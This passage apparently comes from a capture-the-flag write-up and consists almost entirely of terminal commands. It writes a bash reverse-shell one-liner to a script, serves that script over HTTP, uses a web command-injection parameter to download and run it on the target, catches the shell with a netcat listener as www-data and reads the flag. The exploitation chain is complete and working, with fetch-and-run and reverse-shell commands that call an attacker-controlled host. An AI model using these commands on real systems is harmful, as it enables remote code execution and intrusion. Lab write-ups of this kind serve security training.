└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'" > exploit.sh

```

```bash
?cmd=wget http://10.10.14.4:3636/exploit.sh
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ python3 -m http.server 3636
Serving HTTP on 0.0.0.0 port 3636 (http://0.0.0.0:3636/) ...
10.13.37.15 - - [20/Aug/2025 09:49:09] "GET /exploit.sh HTTP/1.1" 200 -
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
?cmd=bash exploit.sh
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
Connection received on 10.13.37.15
www-data@0474e1401baa:~/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
www-data@0474e1401baa:~/web$ cd ..
www-data@0474e1401baa: cat ../flag.txt 
AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
www-data@0474e1401baa:
```

---

> **Updating...**

---
